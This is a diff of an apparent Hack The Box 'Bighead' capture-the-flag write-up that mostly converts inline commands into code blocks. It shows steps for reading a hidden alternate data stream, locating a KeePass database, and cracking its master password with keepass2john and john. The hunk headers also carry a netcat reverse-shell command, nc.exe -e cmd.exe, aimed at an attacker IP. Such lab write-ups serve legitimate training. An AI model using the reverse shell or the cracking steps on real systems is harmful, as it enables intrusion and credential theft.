-<br> After reading <a href="https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/" target="_blank" rel="noopener noreferrer">this article</a> I did it like this : <code class="highlighter-rouge">more &lt; "C:\Users\Administrator\Desktop\root.txt:Zone.Identifier"</code> and saved the output to a file and named it <code class="highlighter-rouge">test</code>
+<br> After reading <a href="https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/" target="_blank" rel="noopener noreferrer">this article</a> I did it like this :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>more &lt; "C:\Users\Administrator\Desktop\root.txt:Zone.Identifier"
+</code></pre></div></div>
+<p><br> And I saved the output to a file and named it <code class="highlighter-rouge">test</code>
 <img src="/images/hackthebox/bighead/137.png" alt="">
 <br>
 <br>
@@ -866,8 +837,10 @@ system('C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339');
 <br>
 <br>
 <img src="/images/hackthebox/bighead/144.png" alt="">
-<br> And of course we need a password and a key. I went back to the shell and checked the configuration file for <code class="highlighter-rouge">keepass</code> in <code class="highlighter-rouge">C:\Users\Administrator\AppData\Roaming\KeePass</code>
-<img src="/images/hackthebox/bighead/145.png" alt="">
+<br> And of course we need a password and a key. I went back to the shell and checked the configuration file for <code class="highlighter-rouge">keepass</code> in :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\AppData\Roaming\KeePass
+</code></pre></div></div>
+<p><img src="/images/hackthebox/bighead/145.png" alt="">
 <br>
 <br>
 <img src="/images/hackthebox/bighead/146.png" alt="">
@@ -1057,9 +1030,10 @@ system('C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339');
 <br> Perfect ! Now we need the password. I used <code class="highlighter-rouge">keepass2john</code> to put the <code class="highlighter-rouge">kdbx</code> file in a <code class="highlighter-rouge">john</code> crackable format (we need the key to do that (<code class="highlighter-rouge">admin.png</code>))
 <code class="highlighter-rouge">keepass2john -k admin.png &gt; db.john</code>
 <img src="/images/hackthebox/bighead/155.png" alt="">
-<br> Then I used <code class="highlighter-rouge">john</code> with <code class="highlighter-rouge">rockyou.txt</code> to crack it :
-<code class="highlighter-rouge">john --wordlist=/usr/share/wordlists/rockyou.txt db.john</code>
-<img src="/images/hackthebox/bighead/156.png" alt="">
+<br> Then I used <code class="highlighter-rouge">john</code> with <code class="highlighter-rouge">rockyou.txt</code> to crack it :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --wordlist=/usr/share/wordlists/rockyou.txt db.john
+</code></pre></div></div>
+<p><img src="/images/hackthebox/bighead/156.png" alt="">
 <br> The password is <code class="highlighter-rouge">darkness</code>. Let’s try to open the database :
 <img src="/images/hackthebox/bighead/157.png" alt="">
 <br>
